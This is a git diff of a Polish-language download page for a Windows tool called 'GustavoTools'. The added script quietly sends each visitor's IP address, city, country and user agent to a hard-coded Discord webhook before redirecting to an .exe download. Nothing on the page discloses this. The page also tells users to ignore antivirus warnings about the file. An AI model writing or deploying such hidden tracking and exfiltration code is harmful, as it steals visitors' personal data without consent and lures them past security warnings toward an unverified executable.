@@ -24,6 +24,7 @@
       border-radius: 12px;
       cursor: pointer;
       box-shadow: 0 0 20px #ff073a;
+      margin: 10px;
     }
     button:hover {
       background-color: #cc0029;
@@ -37,7 +38,46 @@
 </head>
 <body>
   <h1>GustavoTools</h1>
-  <button onclick="handleDownload()">Pobierz</button>
+
+  <!-- 1.1.0 -->
+  <button onclick="handleDownload()">Pobierz najnowszą wersję</button>
+
+  <script>
+    async function handleDownload() {
+      try {
+        const location = await fetch("https://ipapi.co/json/").then(res => res.json());
+
+        const ip = location.ip || "Nieznane";
+        const city = location.city || "Nieznane";
+        const country = location.country_name || "Nieznane";
+        const userAgent = navigator.userAgent;
+
+        const message = `**Nowe pobranie GustavoTools**
+🌐 IP: \`${ip}\`
+🏙️ Miasto: \`${city}\`
+🏴 Kraj: \`${country}\`
+📱 Urządzenie: \`${userAgent}\`
+**pobrana wersja: v1.0.0**`;
+
+        await fetch("https://discord.com/api/webhooks/1391547254036500540/sWJmd-1sylhKt6FNVXSw63FYu9A_AhKLERYI1xugPGleIgM1YCJBfWnFVaV4wDQiQUoQ", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ content: message })
+        });
+      } catch (error) {
+        console.warn("Nie udało się wysłać danych na webhook (CORS?):", error);
+      }
+
+      // 🔽 Pobranie pliku z GitHub Releases
+      window.location.href = "https://github.com/kostek1123Q/gustavotools1.1.0/releases/download/v.1.1.0/GustavoTools.exe";
+    }
+  </script>
+
+  <!-- 1.0.0 -->
+  <button onclick="handleDownload()">Pobierz wersję 1.0.0</button>
+
   <p>jezeli wyswietli sie komunikat z antywirusa, ziignoruj go. wyswietla sie bo wydawca jest nieznany.</p>
 
   <script>
